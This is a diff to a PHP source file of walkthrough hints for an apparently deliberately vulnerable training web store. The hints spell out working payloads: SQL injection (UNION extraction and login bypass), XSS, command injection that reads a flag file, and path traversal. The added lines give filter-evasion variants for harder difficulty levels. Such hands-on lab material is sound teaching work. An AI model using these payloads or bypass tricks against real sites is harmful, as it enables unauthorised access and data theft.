@@ -4,7 +4,7 @@ function WALKTHROUGHS(): array {
     return [
       // 🛒 Voltmart
       'sqli-search'  => ["Open the store search box.","The query is built with string concatenation.","Inject a UNION: <code>' UNION SELECT 1,secret,3,4 FROM users--</code> to pull the admin secret column.","The leaked secret is the flag."],
-      'sqli-login'   => ["Go to the customer login.","Username: <code>' OR '1'='1'-- </code>, any password.","The WHERE clause is bypassed and you log in as the first user (admin)."],
+      'sqli-login'   => ["Go to the customer login.","In the email field put <code>' OR is_admin=1-- </code> and any password.","The WHERE clause matches the first admin row, logging you in as the administrator."],
       'xss-reviews'  => ["Post a product review containing <code>&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code>.","The review is stored and rendered unescaped for every visitor — the script runs."],
       'xss-profile'  => ["Account → Display name.","Set it to <code>&lt;img src=x onerror=alert(1)&gt;</code>.","It's echoed unescaped on your profile/order pages."],
       'cmdi'         => ["Admin → network ping tool.","Input is passed to a shell. Append <code>; cat /flag_cmdi.txt</code> (or <code>| type</code> on Windows).","The command runs and prints the flag file."],
@@ -60,6 +60,9 @@ function walkthrough(string $id): array { return WALKTHROUGHS()[$id] ?? []; }
 function WT_MEDHIGH(): array {
     return [
       'sqli-search' => "The words <code>union</code> and <code>select</code> are stripped once (case-insensitive). Nest them so a copy survives the filter: <code>' UNIunionON SELselectECT 1,secret,3,4,5,6 FROM users-- </code>",
+      'sqli-login'  => "<b>Medium</b> strips the keyword once — nest it: <code>' OORR is_admin=1-- </code>. <b>High</b> strips space-delimited keywords — wrap it in comments instead: <code>'/**/OR/**/is_admin=1-- </code>",
+      'ms-xss'      => "<b>Medium</b> strips <code>&lt;script&gt;</code> — use an event handler: <code>&lt;img src=x onerror=alert(1)&gt;</code>. <b>High</b> also strips <code>onerror</code> — switch vectors: <code>&lt;svg onload=alert(1)&gt;</code>",
+      'lfi'         => "<b>Medium/High</b> strip <code>../</code> once — nest it so a copy reassembles: <code>....//....//....//....//secret_lfi</code>",
     ];
 }
 /* What the Secure (fixed) implementation does — why the Low payload no longer works. */
